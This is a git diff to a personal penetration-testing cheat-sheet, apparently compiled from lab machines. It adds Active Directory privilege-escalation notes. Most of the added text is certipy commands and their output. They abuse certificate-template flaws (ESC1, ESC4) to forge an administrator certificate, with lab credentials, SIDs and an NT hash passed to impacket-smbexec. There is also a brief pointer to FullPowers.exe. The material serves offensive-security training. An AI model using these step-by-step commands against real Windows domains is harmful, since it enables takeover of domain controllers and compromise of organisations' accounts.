@@ -129,6 +129,7 @@ export KRB5CCNAME=ryan.davies@HTTP_lus2dc.lustrous2.vl@LUSTROUS2.VL.ccache
 
 ## Privilege Escalation
 
+AD ATTACK 
 ```bash
 ForceChangePassword
 
@@ -156,7 +157,12 @@ KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache netexec smb dc.pha
 #---------------
 ```
 
-### ESC1
+```bash
+when getting service accoutn with [nt system\ local service] use [FullPowers.exe] to enabled other privilege
+
+```
+
+### ECS1
 
 ```bash
 proxychains -q certipy-ad req -u nigel.mills -p Sail2Boat3 -target-ip 10.129.234.42 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn _admin -key-size 4096 -debug -sid S-1-5-21-87560095-894484815-3652015022-500
@@ -166,7 +172,105 @@ proxychains -q certipy-ad auth -pfx _admin.pfx -domain shibuya.vl -dc-ip 10.129.
 impacket-smbexec _admin@shibuya.vl -hashes :bab5b2a004eabb11d865f31912b6b430
 ```
 
+```bash
+Step By Step Exploit
 
+proxychains certipy req -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn administrator@shibuya.vl -target AWSJPDC0522.shibuya.vl
+ProxyChains-3.1 (http://proxychains.sf.net)
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+|S-chain|-<>-127.0.0.1:1080-<><>-10.129.234.42:445-<><>-OK
+[-] Got error while trying to request certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
+[*] Request ID is 4
+Would you like to save the private key? (y/N) 
+[-] Failed to request certificate
+
+#------------------------------------
+
+proxychains certipy req -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn administrator@shibuya.vl -target AWSJPDC0522.shibuya.vl -key-size 4096
+ProxyChains-3.1 (http://proxychains.sf.net)
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+|S-chain|-<>-127.0.0.1:1080-<><>-10.129.234.42:445-<><>-OK
+[*] Successfully requested certificate
+[*] Request ID is 7
+[*] Got certificate with UPN 'administrator@shibuya.vl'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+
+#--------------------------------------
+Error With upn(user principal name) 
+proxychains certipy auth -pfx administrator.pfx -dc-ip 127.0.0.1
+ProxyChains-3.1 (http://proxychains.sf.net)
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@shibuya.vl
+[*] Trying to get TGT...
+|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:88-<><>-OK
+[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+
+#---------------------------------------
+Changing upn to _admin
+proxychains certipy req -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn _admin@shibuya.vl -target AWSJPDC0522.shibuya.vl -key-size 4096
+ProxyChains-3.1 (http://proxychains.sf.net)
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+|S-chain|-<>-127.0.0.1:1080-<><>-10.129.234.42:445-<><>-OK
+[*] Successfully requested certificate
+[*] Request ID is 9
+[*] Got certificate with UPN '_admin@shibuya.vl'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to '_admin.pfx'
+
+#----------------------------------------
+Error with sid 
+proxychains certipy auth -pfx _admin.pfx -dc-ip 127.0.0.1
+ProxyChains-3.1 (http://proxychains.sf.net)
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: _admin@shibuya.vl
+[*] Trying to get TGT...
+|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:88-<><>-OK
+[-] Object SID mismatch between certificate and user '_admin'
+
+#-----------------------------------------
+Adding SID
+proxychains certipy req -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn _admin@shibuya.vl -target AWSJPDC0522.shibuya.vl -key-size 4096 -sid S-1-5-21-87560095-894484815-3652015022-500
+ProxyChains-3.1 (http://proxychains.sf.net)
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+|S-chain|-<>-127.0.0.1:1080-<><>-10.129.234.42:445-<><>-OK
+[*] Successfully requested certificate
+[*] Request ID is 11
+[*] Got certificate with UPN '_admin@shibuya.vl'
+[*] Certificate object SID is 'S-1-5-21-87560095-894484815-3652015022-500'
+[*] Saved certificate and private key to '_admin.pfx'
+```
+
+### ECS4
+
+```bash
+certipy find -vulnerable -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66 -stdout
+[!] Vulnerabilities
+      ESC4                              : User has dangerous permissions.
+
+certipy template -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66 -template SendaiComputer -write-default-configuration -no-save # [-template need to be change] after that we enabled ecs1 attack
+
+
+certipy find -vulnerable -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66 -stdout
+[!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.
+      ESC4                              : User has dangerous permissions.
+
+certipy req -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66 -ca sendai-DC-CA -target DC.sendai.vl -template SendaiComputer -upn administrator@sendai.vl -sid S-1-5-21-3085872742-570972823-736764132-500
+
+certipy auth -pfx administrator.pfx -dc-ip 10.129.234.66 # [if this is not working use below]
+certipy-ad auth -ldap-shell -pfx administrator.pfx -dc-ip 10.129.234.66 -username administrator -domain sendai.vl
+```
 
 ### ECS8
 
